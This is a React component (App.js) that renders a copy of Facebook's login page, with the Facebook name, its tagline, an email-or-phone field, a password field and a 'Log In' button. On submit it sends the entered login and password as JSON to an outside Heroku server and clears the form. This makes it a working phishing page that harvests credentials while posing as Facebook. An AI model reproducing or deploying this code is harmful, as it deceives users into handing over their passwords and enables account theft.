import React, { useRef } from "react";
import "./App.css";
import intializeAuthentication from "./firebase/firebase.init";
intializeAuthentication();

function App() {
  const nameRef = useRef();
  const emailRef = useRef();

  const handleAddUser = (e) => {
    const name = nameRef.current.value;
    const email = emailRef.current.value;

    const newUser = { name, email };

    fetch("https://guarded-refuge-15901.herokuapp.com/users", {
      method: "POST",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(newUser),
    })
      .then((res) => res.json())
      .then((data) => {
        if (data.insertedId) {
          // alert("Successfully added the user.");
          e.target.reset();
        }
      });
    e.preventDefault();
  };

  return (
    <>
      <div className="h1">
        <h1 className="h">facebook</h1>
        <p className="pr">
          Facebook helps you connect and share with the people in your life.
        </p>
      </div>
      <form className="main" onSubmit={handleAddUser}>
        <input
          type="text"
          placeholder="Email address or phone number"
          class="txt"
          ref={nameRef}
        />
        <br />
        <input
          type="password"
          placeholder="Password"
          class="txt"
          ref={emailRef}
        />
        <br />
        <input type="submit" value="Log In" class="login-btn" />
        <br></br>

        <div className="a-link">
          <a href="/" className="link">
            Forgotten Password?
          </a>
        </div>
        <div className="ca">
          <a href="/" class="pca">
            Create New Account
          </a>
        </div>
      </form>
    </>
  );
}

//   return (
//     <div>
//       <h2>Please Add an User</h2>
//       <form onSubmit={handleAddUser}>
//         <input type="text" ref={nameRef} />
//         <input type="text" name="" id="" ref={emailRef} />
//         <input type="submit" value="Add" />
//       </form>
//     </div>
//   );
// }

export default App;
